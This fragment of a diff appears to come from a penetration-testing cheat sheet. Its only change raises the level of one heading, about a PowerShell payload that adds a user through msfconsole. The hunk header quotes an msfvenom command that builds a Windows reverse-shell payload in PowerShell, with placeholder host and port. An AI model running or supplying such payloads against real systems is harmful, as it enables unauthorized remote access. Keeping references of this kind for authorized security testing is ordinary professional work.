@@ -25,7 +25,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f psh -o shel
 {% endtab %}
 {% endtabs %}
 
-#### Add User Payload Using PowerShell (msfconsole)
+### Add User Payload Using PowerShell (msfconsole)
 
 ```powershell
   # Create a PowerShell command that adds the user
